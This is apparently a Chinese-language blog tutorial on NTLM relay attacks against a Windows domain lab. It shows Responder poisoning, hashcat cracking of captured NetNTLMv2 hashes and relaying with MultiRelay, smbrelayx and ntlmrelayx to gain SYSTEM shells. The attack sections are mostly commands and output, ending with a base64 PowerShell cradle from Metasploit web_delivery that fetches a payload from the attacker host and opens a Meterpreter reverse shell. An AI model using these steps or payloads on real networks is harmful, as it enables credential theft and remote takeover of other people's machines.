---
title: NTLM relay
published: 2025-03-09 16:46:27
tags: [内网安全,域渗透]
category: 安全
draft: false
---

# NTLM relay

![NTLM中继原理图](image%2022.png)

NTLM中继原理图

在客户端的视角里，攻击端就是服务端；在服务端是叫你，攻击端就是客户端；

攻击者所做的事情只是把所有客户端的请求relay到服务端，并把所有服务端的请求relay到客户端。而在服务端看来，一直以来只有攻击者在跟他交互，所以自然而然就认为攻击者就是客户端，这样子攻击者就达到了伪造成真正客户端的目的

主要分为NTLMv1版本与NTMLv2版本

NTLMv1版本的response可以很容易爆破出用户的hash，相比较而言不安全。

而NTLMv2版本使用了HMAC_MD5函数，所以通过response很难被爆破出真正的用户hash，只能通过暴力破解。

## NTLM relay  攻击

### Windows系统域名解析顺序

1. 本地hosts文件（%windir%\System32\drivers\etc\hosts）
2. DNS缓存/DNS服务器
3. 链路本地多播名称解析（`LLMNR`）和NetBIOS名称服务（`NBT-NS`） 当用户解析一个无法被解析的主机名的时候，就会走LLMNR协议或者NBT-NS协议。这时候我们就可以做手脚来让用户认为我们就是它想访问的目标，进而跟我们进行NTLM认证，这样子我们就能够获取到其NET-NTLM hash

### relay攻击步骤

1. 获得受害者的`Net-NTLM Hash`
2. 使用`Net-NTLM Hash`进行重放攻击

因为Net-NTLM Hash不能直接发送给电脑，必须要有一个应用层协议来进行封装，如SMB、HTTP、RPC、LDAP，但是能不能中继到该协议，还需要看一下该协议是否有漏洞，是否支持等等

### 捕获 Net-NTLM Hash

1. 在B电脑上发起监听
2. A电脑发送认证信息

![image.png](image%2023.png)

- `LLMNR`&`NBNS` ，下边有实验
- 利用系统命令
    
    ```python
    net.exe use \hostshare
    attrib.exe \hostshare
    cacls.exe \hostshare
    certreq.exe \hostshare
    certutil.exe \hostshare
    cipher.exe \hostshare
    ClipUp.exe -l \hostshare
    cmdl32.exe \hostshare
    ```
    
- 利用`HTTP`服务
    
    ```python
    responder -I eth0 -wd  
    ```
    
    会开启恶意的HTTP服务器，提示需要授权，让其输入账号密码，输入后即可
    
    ![image.png](image%2024.png)
    

### relay 攻击工具

> https://github.com/lgandx/Responder
> 

> https://github.com/Kevin-Robertson/Inveigh
> 

## Responder

### 使用

1. 这里使用`Responder` （由`Python`编写），`kali`里面自带的了，在`Github`中下载的执行会显示端口被占用
    
    ```python
    responder -I eth0 -wd  
    ```
    
    `eth0`为网卡（与被攻击主机在同一网络的网卡，一般来说），`-wd`启用 **Web 服务器** 和 **DNS** 欺骗功能
    
    ```python
                                             __                                                 
      .----.-----.-----.-----.-----.-----.--|  |.-----.----.                               
      |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|                               
      |__| |_____|_____|   __|_____|__|__|_____||_____|__|                                 
                       |__|                                                                
                                                                                           
               NBT-NS, LLMNR & MDNS Responder 3.1.5.0     
    [+] Generic Options:                       
        Responder NIC              [eth0]      
        Responder IP               [192.168.52.128]                                        
        Responder IPv6             [fe80::a34b:ce90:838a:bf55]                             
        Challenge set              [random]    
        Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']                                   
        Don't Respond To MDNS TLD  ['_DOSVC']  
        TTL for poisoned response  [default]   
                                                                                           
    [+] Current Session Variables:                                                         
        Responder Machine Name     [WIN-12W2B1AC3R0]                                       
        Responder Domain Name      [Y7BP.LOCAL]                                            
        Responder DCE-RPC Port     [45737]                                                 
                                               
    [+] Listening for events...               
                                                                                                
    [*] [NBT-NS] Poisoned answer sent to 192.168.52.138 for name OWA.GOD.ORG (service: Domain Controller)
    [*] [NBT-NS] Poisoned answer sent to 192.168.52.143 for name OWA.GOD.ORG (service: Domain Controller)
    ```
    
2. 根据局域网内域名解析顺序，我们如果使用主机（`192.168.52.138`）去访问域控（`192.168.52.143` `OWA.GOD.ORG`）不会经过我们，而会直接去访问域控
3. 我们通过访问局域网内不存在的主机，则会经过我们（这里利用了`LLMNR`&`NBNS`攻击来获取`NET-NTLM hash`）
    
    ![image.png](image%2025.png)
    
    访问不存在 `owa11.god.org` ,我们就能捕捉到主机`192.168.52.138` 的**`NET-NTLM hash`**
    
    ![image.png](image%2026.png)
    
4. 破解可以通过`hashcat`来尝试破解
    
    ```python
    hashcat -m 5600 -a 0 hash.txt pass.txt
    ```
    
    `-m` 是指定加密类型，`5600`是指`NTLMv2` ，这里运气好（强大的字典）直接破解出来了
    
    ```python
    Session..........: hashcat                                
    Status...........: Exhausted
    Hash.Mode........: 5600 (NetNTLMv2)
    Hash.Target......: A::GOD:9747b8c1ec408e19:e7ab1b63a3f93a5853fa180cd59...49004e
    Time.Started.....: Sat Nov 30 02:33:56 2024 (0 secs)
    Time.Estimated...: Sat Nov 30 02:33:56 2024 (0 secs)
    Kernel.Feature...: Pure Kernel
    Guess.Base.......: File (pass.txt)
    Guess.Queue......: 1/1 (100.00%)
    Speed.#1.........:      598 H/s (0.16ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
    Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
    Progress.........: 1/1 (100.00%)
    Rejected.........: 0/1 (0.00%)
    Restore.Point....: 1/1 (100.00%)
    Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
    Candidate.Engine.: Device Generator
    Candidates.#1....: Aa20040422 -> Aa20040422
    Hardware.Mon.#1..: Util:  8%
    ```
    

## 其他方式的NTLM-relay攻击

**当密码没破解出来时**，将凭据`relay`到其他主机上，如果这个凭据权限足够，那么就能控制对方主机，属于被动攻击，能获取到什么权限主要看运气

不能将凭据`relay`到凭据真正持有者的主机，只能`relay`到其他主机

简单说就是，A登陆了administrator这个账户，我们通过手段拿到A的Net-NTLM Hash后无法直接把这个Hash传递回A，但是如果域内的B也可以通过administrator这个账户登录，那我们可以把从A处获得的Hash传递给B，拿到B处的administrator权限

这个攻击的前提是：目标主机没有开启`SMB`签名，一般情况下域里边只有域控是开启`SMB`签名的，其余主机不会开启，下面是将`SMB`签名关掉的方法

```python
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters"requiresecuritysignature"=dword:00000000
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Lanmanworkstation\Parameters"requiresecuritysignature"=dword:00000000
```

### 使用脚本探测出主机

使用`Responder`自带的脚本`Runfinger` ，存放于`Responder`下的`tools`文件夹内

```python
python RunFinger.py -i 192.168.52.1/24
[SMB2]:['192.168.52.143', Os:'Windows 7/Server 2008R2', Build:'7601', Domain:'GOD', Bootime: '2024-11-30 02:03:32', Signing:'False', RDP:'True', SMB1:'True', MSSQL:'False']
[SMB1]:['192.168.52.143', Os:'Windows 7 Professional 7601 Service Pack 1', Domain:'GOD', Signing:'False', Null Session: 'True', RDP:'True', MSSQL:'False']
[SMB2]:['192.168.52.138', Os:'Windows 7/Server 2008R2', Build:'7601', Domain:'GOD', Bootime: '2024-11-30 02:03:30', Signing:'True', RDP:'False', SMB1:'True', MSSQL:'False']
[SMB1]:['192.168.52.138', Os:'Windows Server 2008 R2 Datacenter 7601 Service Pack 1', Domain:'GOD', Signing:'False', Null Session: 'True', RDP:'False', MSSQL:'False']
```

可以看到`192.168.52.143-Win7` 没开启`SMB`签名，可作为攻击目标

### 修改Responder的配置文件

关闭`SMB`和`HTTP` ，是因为下面的`relay`利用文件需要使用到`80`和`445`端口，而`Responder`默认会监听这些端口

```python
# vim /usr/share/responder/Responder.conf 
; Servers to start
SQL      = On
SMB      = Off
RDP      = On 
Kerberos = On
FTP      = On
POP      = On
SMTP     = On
IMAP     = On
HTTP     = Off
```

`Responder` 在这里的作用是当访问一个不存在的共享路径，将名称解析降到LLMNR/NBNS时来抓取网络中所有的LLMNR和NetBIOS请求并进行响应

在攻击时直接利用该`hash`攻击其他机器即可不需要抓取，下面的操作都是先将`Responder` 运行

### MultiRelay.py

执行后如果有足够的权限的用户凭据，攻击机即可获得其shell

- Kali
    
    ```c
    ./MultiRelay.py -t 192.168.52.143 -u ALL
    ```
    
- `138`，访问不存在主机（`138`现在是域管理员权限），通过`HTTP`协议触发不存在的主机也可以
    
    ```c
    C:\Users\administrator>dir \\asaada\$c
    ```
    
    ![image.png](image%2027.png)
    
- 回到Kali，已经获得shell
    
    ```c
    [+] Setting up SMB relay with SMB challenge: 8c810bdaa1bf3ff1
    [+] Received NTLMv2 hash from: 192.168.52.138 
    [+] Client info: ['Windows Server 2008 R2 Datacenter 7601 Service Pack 1', domain: 'GOD', signing:'True']
    [+] Username: Administrator is whitelisted, forwarding credentials.
    [+] SMB Session Auth sent.
    [+] Looks good, Administrator has admin rights on C$.
    [+] Authenticated.
    [+] Dropping into Responder's interactive shell, type "exit" to terminate
    
    Available commands:
    dump               -> Extract the SAM database and print hashes.
    regdump KEY        -> Dump an HKLM registry key (eg: regdump SYSTEM)
    read Path_To_File  -> Read a file (eg: read /windows/win.ini)
    get  Path_To_File  -> Download a file (eg: get users/administrator/desktop/password.txt)
    delete Path_To_File-> Delete a file (eg: delete /windows/temp/executable.exe)
    upload Path_To_File-> Upload a local file (eg: upload /home/user/bk.exe), files will be uploaded in \windows\temp\
    runas  Command     -> Run a command as the currently logged in user. (eg: runas whoami)
    scan /24           -> Scan (Using SMB) this /24 or /16 to find hosts to pivot to
    pivot  IP address  -> Connect to another host (eg: pivot 10.0.0.12)
    mimi  command      -> Run a remote Mimikatz 64 bits command (eg: mimi coffee)
    mimi32  command    -> Run a remote Mimikatz 32 bits command (eg: mimi coffee)
    lcmd  command      -> Run a local command and display the result in MultiRelay shell (eg: lcmd ifconfig)
    help               -> Print this message.
    exit               -> Exit this shell and return in relay mode.
                          If you want to quit type exit and then use CTRL-C
    
    Any other command than that will be run as SYSTEM on the target.
    
    Connected to 192.168.52.143 as LocalSystem.
    C:\Windows\system32\:#
    ```
    

### smbrelayx.py

属于`impacket`工具集里边的，上边得到`143` 没开启`SMB`签名，将其作为攻击目标，因为不能将凭据`relay`到凭据真正持有者的主机，只能`relay`到其他主机，所以我们在`138` 上通过SMB或者HTTP协议访问一个不存在主机

- Kali
    
    ```python
    python smbrelayx.py -h 192.168.52.143 -c 'whoami'
    # 
    Impacket v0.12.0.dev1 - Copyright 2023 Fortra
    
    ===============================================================================
      Warning: This functionality will be deprecated in the next Impacket version  
    ===============================================================================
    
    [*] Running in relay mode
    [*] Setting up SMB Server
    [*] Setting up HTTP Server
    
    [*] Servers started, waiting for connections
    ```
    
- `138`，访问不存在主机（`138`现在是域管理员权限）
    
    ```python
    C:\Users\administrator>dir \\asaada\$c
    ```
    
- Kali，得到`whoami`结果
    
    ```python
    Impacket v0.12.0.dev1 - Copyright 2023 Fortra
    
    ===============================================================================
      Warning: This functionality will be deprecated in the next Impacket version  
    ===============================================================================
    
    [*] Running in relay mode
    [*] Setting up SMB Server
    [*] Setting up HTTP Server
    
    [*] Servers started, waiting for connections
    [*] SMBD: Received connection from 192.168.52.138, attacking target 192.168.52.143
    [*] Authenticating against 192.168.52.143 as GOD\Administrator SUCCEED
    [*] Administrator::GOD:6a871d43f17bf06a:9f9aef7723a97b247792a8a60bdaeae7:010100000000000073de42740a43db010b1822fb1c1b1fda000000000200060047004f00440001000800530054005500310004000e0067006f0064002e006f00720067000300180073007400750031002e0067006f0064002e006f007200670005000e0067006f0064002e006f00720067000700080073de42740a43db010600040002000000080030003000000000000000000000000030000099596f38237f6e8c85db8b1bd1fbde3c6c8b1f50d5334504167e1359db5ae5740a001000000000000000000000000000000000000900160063006900660073002f00610073006100610064006100000000000000000000000000
    [*] Sending status code STATUS_SUCCESS after authentication to 192.168.52.138
    [-] TreeConnectAndX not found $C
    [-] TreeConnectAndX not found $C
    [*] Service RemoteRegistry is in stopped state
    [*] Starting service RemoteRegistry
    [*] Executed specified command on host: 192.168.52.143
    nt authority\system
    
    [*] Stopping service RemoteRegistry
    [*] HTTPD: Received connection from 192.168.52.138, attacking target 192.168.52.143
    [*] Authenticating against 192.168.52.143 as GOD\Administrator SUCCEED
    [*] Administrator::GOD:4b0fc04159d5c31d:ac6c561cdbfbca7e69e24ebf1c991880:0101000000000000d30d65770a43db01dde6b5c10f6269d0000000000200060047004f00440001000800530054005500310004000e0067006f0064002e006f00720067000300180073007400750031002e0067006f0064002e006f007200670005000e0067006f0064002e006f007200670007000800d30d65770a43db010600040002000000080030003000000000000000000000000030000099596f38237f6e8c85db8b1bd1fbde3c6c8b1f50d5334504167e1359db5ae5740a001000000000000000000000000000000000000900160048005400540050002f00610073006100610064006100000000000000000000000000
    [*] Service RemoteRegistry is in stopped state
    [*] Starting service RemoteRegistry
    [*] Executed specified command on host: 192.168.52.143
    nt authority\system
    
    [*] Stopping service RemoteRegistry
    ```
    

### **ntlmrelayx.py**

```c
python ntlmrelayx.py -t 192.168.52.143 -c "ipconfig" -smb2support    
#                       
Impacket v0.12.0.dev1 - Copyright 2023 Fortra                                                   
                                                                                                                                                                                        
[*] Protocol Client SMTP loaded..                                                                                                                                                       
[*] Protocol Client SMB loaded..                                                                                                                                                        
[*] Protocol Client DCSYNC loaded..                                                         
[*] Protocol Client LDAPS loaded..                                                          
[*] Protocol Client LDAP loaded..                                                                                                                                                       
[*] Protocol Client HTTP loaded..                                                                                                                                                       
[*] Protocol Client HTTPS loaded..                                                                                                                                                      
[*] Protocol Client RPC loaded..                                                            
[*] Protocol Client MSSQL loaded..                                                                                                                                                      
[*] Protocol Client IMAPS loaded..                                                                                                                                                      
[*] Protocol Client IMAP loaded..                                                           
[*] Running in relay mode to single host                                                                                                                                                
[*] Setting up SMB Server                                                                   
[*] Setting up HTTP Server on port 80                                                       
[*] Setting up WCF Server                                                                                                                                                               
[*] Setting up RAW Server on port 6666                                                                                                                                                  
                                                                                                                                                                                        
[*] Servers started, waiting for connections
```

然后也是`138` 通过SMB协议访问不存在的主机

```c
C:\Users\administrator>dir \\asaada\$c
```

返回`Kali`得到结果

```c
Windows IP ����                                                                                 
                                                                                                                                                                                        
                                                                                                                                                                                        
���������� �������� 5:                                                                                                                                                                  
                                                                                                
   �����ض��� DNS ��׺ . . . . . . . : localdomain                                                
   �������� IPv6 ��. . . . . . . . : fe80::9d4e:da7c:63a:bc8f%26                                                                                                                        
   IPv4 �� . . . . . . . . . . . . : 192.168.111.153                                                                                                                                    
   ��������  . . . . . . . . . . . . : 255.255.255.0                                                                                                                                    
   Ĭ������. . . . . . . . . . . . . : 192.168.111.2                                             
                                                
���������� Npcap Loopback Adapter:                                                                                                                                                      
                                                                                                                                                                                        
   �����ض��� DNS ��׺ . . . . . . . :                                                            
   �������� IPv6 ��. . . . . . . . : fe80::b461:ccad:e30f:81ba%24                               
   �Զ����� IPv4 ��  . . . . . . . : 169.254.129.186                                                                                                                                     
   ��������  . . . . . . . . . . . . : 255.255.0.0                                                                                                                                      
   Ĭ������. . . . . . . . . . . . . :                                                                                                                                                                      
```

## Rsponder + impacket + MSF

可以使用`Responder` + `impacket` + `MSF`来实现获取`Net-NTLM hash`，并通过`ntlm`中继获得域内普通用户的msf shell

- 开启Responder
    
    ```c
    responder -I eth0 -wd
    ```
    
    ```c
    [+] Servers:                                                                                                                                                                            
        HTTP server                [OFF]                                                                                                                                                    
        HTTPS server               [ON]                                                                                                                                                     
        WPAD proxy                 [ON] 
        HTTPS server               [ON]                                                                                                                                    15:09:15 [18/411]
        WPAD proxy                 [ON]                                                                                                                                                     
        Auth proxy                 [OFF]                                                 
        SMB server                 [OFF]                                                 
        Kerberos server            [ON]      
    ```
    
- 启动MSF的`exploit/multi/script/web_delivery`模块
    
    ```c
    msf6 > use exploit/multi/script/web_delivery
    msf6 exploit(multi/script/web_delivery) > 
    msf6 exploit(multi/script/web_delivery) > set lhost 192.168.52.128 （kali IP）
    msf6 exploit(multi/script/web_delivery) > set payload windows/x64/meterpreter/reverse_tcp
    msf6 exploit(multi/script/web_delivery) > run
    [*] Exploit running as background job 0.
    [*] Exploit completed, but no session was created.
    
    [*] Started reverse TCP handler on 192.168.52.128:4444 
    msf6 exploit(multi/script/web_delivery) > [*] Using URL: http://192.168.52.128:8080/gNTjpUMsVFS
    [*] Server started.
    [*] Run the following command on the target machine:
    powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABsAGoAVgA0AD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwBpAGYAKABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBQAHIAbwB4AHkAXQA6ADoARwBlAHQARABlAGYAYQB1AGwAdABQAHIAbwB4AHkAKAApAC4AYQBkAGQAcgBlAHMAcwAgAC0AbgBlACAAJABuAHUAbABsACkAewAkAGwAagBWADQALgBwAHIAbwB4AHkAPQBbAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBHAGUAdABTAHkAcwB0AGUAbQBXAGUAYgBQAHIAbwB4AHkAKAApADsAJABsAGoAVgA0AC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADUAMgAuADEAMgA4ADoAOAAwADgAMAAvAGcATgBUAGoAcABVAE0AcwBWAEYAUwAvAGYASQBvAEsAYwBaADgAbABRAG4AUgBRAEgAeQA1ACcAKQApADsASQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4ANQAyAC4AMQAyADgAOgA4ADAAOAAwAC8AZwBOAFQAagBwAFUATQBzAFYARgBTACcAKQApADsA
    ```
    
    得到一串`Powershell`代码
    
- 运行`impacket`的`ntlmrelayx`
    
    ```c
    python3 ntlmrelayx.py -t 192.168.52.143 -c "" -smb2support
    ```
    
    - `-c` 里边是上边生成的`Powershell`代码
- `138` （任意域内主机）通过`smb`或者`http` （需要提供账号密码）触发
    
    ```c
    C:\Users\administrator>dir \\asaada\$c
    ```
    
- 回到Kali
    
    ```c
    [*] 192.168.52.143   web_delivery - Delivering AMSI Bypass (1380 bytes)
    i[*] 192.168.52.143   web_delivery - Delivering Payload (3707 bytes)
    b[*] Sending stage (201798 bytes) to 192.168.52.143
    [*] Meterpreter session 1 opened (192.168.52.128:4444 -> 192.168.52.143:1904) at 2024-12-01 15:30:35 +0800
    msf6 exploit(multi/script/web_delivery) > sessions 
    
    Active sessions
    ===============
    
      Id  Name  Type                     Information                 Connection
      --  ----  ----                     -----------                 ----------
      1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ STU1  192.168.52.128:4444 -> 192.168.52.143:1904 (192.168.52.143)
    
    msf6 exploit(multi/script/web_delivery) > 
    ```
    
    可以看到存在`sessions` ，并且是`system`权限